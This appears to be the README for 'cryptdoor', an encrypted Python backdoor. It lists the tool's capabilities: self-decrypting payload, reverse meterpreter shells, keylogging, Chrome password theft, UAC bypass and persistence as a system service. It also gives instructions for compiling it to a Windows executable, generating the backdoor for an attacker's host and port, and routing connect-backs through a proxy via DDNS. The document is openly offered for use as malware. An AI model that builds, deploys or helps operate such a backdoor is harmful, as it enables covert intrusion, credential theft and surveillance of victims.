cryptdoor
=========

AES encrypted python backdoor that communicates AES encrypted data.
Shell has the ability to spawn a meterpreter reverse_tcp into memory using VirtualAlloc (taken from Veil-Evasion).
We can also download and upload files over the secure AES encrypted connection.
Keylogging is also implemented for windows using pyHook and the keystrokes are transmitted over the secure AES encrypted connection.
All communications apart from ones meterpreter makes are encrypted with AES.
On top of this the script itself is encrypted with AES and decrypts itself in memory (taken from pyherion).

Compilation
=========

The backdoor script can be compiled to a standalone PE executable using pyinstaller on windows.

1. Install python27: https://www.python.org/ftp/python/2.7.8/python-2.7.8.msi
2. Run this script to install pip: https://bootstrap.pypa.io/get-pip.py
3. Press Windows Key+Pause, then "Advanced system settings" then "Environment Variables"
4. You might or not have a "PATH" variable listed there if not add one and write

	"C:\Python27;C:\Python27\Scripts"

If you do already have one just add a colon before adding this to the variable like:

	"C:\oldpath;C:\Python27;C\Python27\Scripts"

5. Open a new cmd terminal and you should be able to:

	pip install pyinstaller pycrypto

6. Add ';C:\Python27\Lib\site-packages\PyInstaller' to the end of your PATH variable
7. Install pyHook: http://sourceforge.net/projects/pyhook/files/latest/download
8. Install pywin32: http://sourceforge.net/projects/pywin32/files/pywin32/
9. Place the socks.py file in the same directory as backdoor.py
10. Open a new cmd promt and cd to wherever backdoor.py is.

	pyinstaller -F -w backdoor.py

11. That's it, enjoy your exe in dist.

Usage
=========

cryptdoor.py will make the backdoor and server.
The syntax is:

	./cryptdoor.py host port

You can add a -p to attempt automatic persistence like:

	./cryptdoor.py host port -p

host and port refer to the host and port of the listening server.

	AES-shell options:
    	 download file       -  Download a file from remote pwd to localhost.
    	 upload filepath     -  Upload a filepath to remote pwd.
    	 run commands        -  Run a command in the background.
         wget url            -  Download a file from url to pwd.

	Windows Only:
    	 persistence         -  Install exe as a system service backdoor.
    	 meterpreter ip:port -  Execute a reverse_tcp meterpreter to ip:port.
    	 keyscan             -  Start recording keystrokes.
    	 keydump             -  Dump recorded keystrokes.
    	 keyclear            -  Clear the keystroke buffer.
    	 chromepass          -  Retrieve chrome stored passwords.
    	 bypassuac cmds      -  Run commands as admin.

Proxies
=========

If you wish to have your backdoor connect back to you through a HTTP/s proxy, there a few things we have to do:

1. Edit the cryptdoor script from line 245-24, and fill in the values for the proxy details.

2. Get a DDNS pointed at your IP (proxying does not work without one.)

3. Then generate your backdoor in the normal way but replace the IP with your DDNS:

	./cryptdoor.py DDNS port



